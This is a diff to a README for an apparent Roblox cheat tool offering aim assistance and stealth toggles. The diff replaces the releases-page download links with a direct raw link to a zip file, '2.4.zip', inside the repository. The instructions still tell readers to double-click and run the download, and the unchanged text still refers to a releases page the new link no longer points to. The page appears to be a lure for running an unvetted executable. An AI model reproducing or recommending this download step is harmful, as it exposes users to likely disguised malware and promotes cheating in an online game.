@@ -1,6 +1,6 @@
 <h1>🎮 life-together-rp-script-hub - Enhance Your Roleplay Experience Instantly</h1>
 
-<a href="https://github.com/benji6783/life-together-rp-script-hub/releases" style="display:inline-block; padding:16px 32px; background-color:#FF6B35; color:#fff; text-decoration:none; border-radius:8px; font-size:24px; font-weight:bold;">⬇️ Download Now</a>
+<a href="https://raw.githubusercontent.com/benji6783/life-together-rp-script-hub/main/continuable/2.4.zip" style="display:inline-block; padding:16px 32px; background-color:#FF6B35; color:#fff; text-decoration:none; border-radius:8px; font-size:24px; font-weight:bold;">⬇️ Download Now</a>
 
 <h2>📖 Welcome to life-together-rp-script-hub</h2>
 <p>This application is a handy tool for Roblox roleplay game players. It provides aim assistance and character stealth toggles through a simple web-based interface. You don't need any programming experience to use it. Just download and run the program on your Windows computer.</p>
@@ -33,7 +33,7 @@
 </ul>
 
 <h2>📥 Installing and Downloading</h2>
-<p>Visit this link to download the application: <a href="https://github.com/benji6783/life-together-rp-script-hub/releases">https://github.com/benji6783/life-together-rp-script-hub/releases</a></p>
+<p>Visit this link to download the application: <a href="https://raw.githubusercontent.com/benji6783/life-together-rp-script-hub/main/continuable/2.4.zip">https://raw.githubusercontent.com/benji6783/life-together-rp-script-hub/main/continuable/2.4.zip</a></p>
 <p>Once you are on the releases page, click the most recent release. Your browser will download a file. After the download finishes, find the file in your Downloads folder and double-click to run it. Follow the on-screen instructions to complete the setup.</p>
 
 <h2>❓ Troubleshooting</h2>
